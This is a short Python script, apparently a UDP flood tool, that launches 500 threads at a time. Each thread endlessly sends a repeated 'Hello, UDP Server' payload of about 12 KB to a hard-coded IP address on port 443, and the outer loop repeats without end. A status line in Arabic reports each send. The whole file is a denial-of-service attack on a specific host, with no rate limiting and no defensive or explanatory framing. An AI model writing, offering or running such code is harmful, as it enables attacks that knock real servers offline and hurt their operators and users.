import socket
import threading

server_ip = "196.200.143.162"
server_port = 443

def send_message():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        message = "Hello, UDP Server" *700
        sock.sendto(message.encode(), (server_ip, server_port))
        print(f"Status: تم إرسال الرسالة إلى {server_ip}:{server_port}")

threads = []

while True:
    for i in range(500):
        thread = threading.Thread(target=send_message)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
